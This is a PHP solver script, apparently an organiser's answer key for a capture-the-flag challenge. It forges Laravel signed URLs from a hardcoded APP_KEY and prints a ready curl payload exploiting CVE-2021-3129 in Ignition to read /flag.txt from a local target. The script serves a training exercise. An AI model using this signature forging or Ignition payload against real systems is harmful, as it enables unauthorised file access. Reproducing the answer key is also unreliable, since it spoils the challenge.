<?php
/**
 * Signed URL Generator - CTF Helper
 * DO NOT DISTRIBUTE TO PLAYERS
 * 
 * Generates signed URLs for both endpoints:
 * - /system/export (red herring)
 * - /_ignition/execute-solution (the real target)
 * 
 * Usage: php generate_signed_url.php [base_url]
 */

$baseUrl = $argv[1] ?? 'http://localhost:5050';
$baseUrl = rtrim($baseUrl, '/');

// The FULL APP_KEY from .env.docker
// CRITICAL: Laravel uses the RAW string (with base64: prefix) as HMAC key!
$appKey = 'base64:dGhpc2lzYXNlY3JldGtleWZvcmN0ZmNoYWxsZW5nZSE=';

echo "=== Laravel Signed URL Generator (v2) ===\n\n";
echo "APP_KEY: {$appKey}\n";
echo "NOTE: Laravel uses the FULL string (with base64: prefix) as the HMAC key!\n\n";

// Generate expiration timestamp (5 minutes from now)
$expires = time() + 300;

//
// URL 1: /system/export (red herring - no flag here)
//
echo "--- /system/export (Red Herring) ---\n";
$urlExport = "{$baseUrl}/system/export?expires={$expires}";
$sigExport = hash_hmac('sha256', $urlExport, $appKey);
$signedExport = "{$urlExport}&signature={$sigExport}";

echo "URL: {$signedExport}\n";
echo "Note: This endpoint does NOT contain the flag!\n\n";

//
// URL 2: /_ignition/execute-solution (CVE-2021-3129 target)
//
echo "--- /_ignition/execute-solution (CVE-2021-3129 Target) ---\n";
$urlIgnition = "{$baseUrl}/_ignition/execute-solution?expires={$expires}";
$sigIgnition = hash_hmac('sha256', $urlIgnition, $appKey);
$signedIgnition = "{$urlIgnition}&signature={$sigIgnition}";

echo "URL: {$signedIgnition}\n\n";

echo "To exploit CVE-2021-3129, POST to the signed URL with:\n";
echo "curl -X POST '{$signedIgnition}' \\\n";
echo "  -H 'Content-Type: application/json' \\\n";
echo "  -d '{\n";
echo "    \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\n";
echo "    \"parameters\": {\n";
echo "      \"variableName\": \"x\",\n";
echo "      \"viewFile\": \"/flag.txt\"\n";
echo "    }\n";
echo "  }'\n\n";

echo "Expires: " . date('Y-m-d H:i:s', $expires) . " UTC\n";
echo "Use within 5 minutes!\n";
